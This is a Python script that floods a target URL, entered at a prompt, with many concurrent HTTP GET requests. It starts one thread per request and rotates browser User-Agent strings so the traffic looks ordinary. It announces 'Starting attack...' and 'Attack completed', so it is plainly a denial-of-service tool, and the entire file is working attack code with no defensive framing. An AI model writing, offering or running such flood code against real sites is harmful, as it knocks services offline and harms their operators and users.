import threading
import random
import requests

def send_flood_requests(url, num_requests):
    """Send multiple HTTP GET requests with random User-Agent and custom payload to a URL."""
    headers_useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        # Add more User-Agents if needed
    ]

    def send_request():
        headers = {
            "User-Agent": random.choice(headers_useragents),
            "Connection": "keep-alive",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
        }
        payload = f"GET {url} HTTP/1.1\r\n" \
                  f"Host: {url.split('//')[1]}\r\n" \
                  f"User-Agent: {headers['User-Agent']}\r\n" \
                  f"Connection: {headers['Connection']}\r\n\r\n"

        try:
            response = requests.get(url, headers=headers, data=payload)
            print(f"Request sent with status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending request: {e}")

    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("Enter the target URL: ").strip()
    try:
        number_of_requests = int(input("Enter the number of requests to send: "))
        print("Starting attack...")
        send_flood_requests(target_url, number_of_requests)
        print("Attack completed.")
    except ValueError:
        print("Please enter a valid number for the number of requests.")
